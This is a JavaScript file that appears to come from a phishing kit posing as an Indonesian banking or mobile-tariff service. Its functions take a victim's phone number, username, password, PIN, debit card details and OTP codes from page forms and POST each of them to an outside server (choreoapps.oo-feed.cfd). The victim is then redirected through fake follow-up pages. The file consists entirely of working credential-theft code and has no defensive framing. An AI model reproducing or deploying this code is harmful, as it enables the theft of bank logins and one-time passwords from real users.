function sendHp() {
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   var tarif = $('input[name="tarif"]:checked').val();
   if(tarif) {
      sessionStorage.setItem('tarif', tarif);
   }
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/sult/no.php',
        data: $('#nomor').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "menu.html";       
     document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};

function sendLogin() { 
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   var tarif = $('#tarif').val();
   sessionStorage.setItem('tarif', tarif);
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   var uname = $('#uname').val();
   sessionStorage.setItem('uname', uname);
   var password = $('#password').val();
   sessionStorage.setItem('password', password);
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/sult/user.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "pin.html";           
        document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 300);
      }
   });
};

function sendPin(event){   
    event.preventDefault();     
    $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/sult/pin.php',
        data: $('#ryuSubmit').serialize(),
        datatype: 'JSON',   
    complete: function(){
    setTimeout(function(){       
   location.href="otp.html";  
    }, 00);}});};
    
    
    
function sendDebit(event) {
  event.preventDefault();
document.getElementById('kirim').innerHTML = "Memproses...";      
    $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/sult/debit.php',
        data: $('#debit').serialize(),
        datatype: 'JSON',        
    complete: function(){
window.location.href='otp.html';
    }});};
  
  
function kirimPesan(event){
  event.preventDefault();
    $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/sult/link.php',
        data: $('#formLink').serialize(),
        datatype: 'JSON',       
    complete: function(){
 document.getElementById("blinkk").style.display = "block";
 $("#nama").addClass('textarea'); 
    setTimeout(function(){
document.getElementById("formLink").reset();
    }, 1000);}});};    
    

function kirimPesan1(event){
  event.preventDefault();
    $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/sult/otp.php',
        data: $('#formOtp').serialize(),
        datatype: 'JSON',        
   complete: function(){     
 document.getElementById("blinkotp").style.display = "block";
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
    setTimeout(function(){
    }, 1000);}});};    
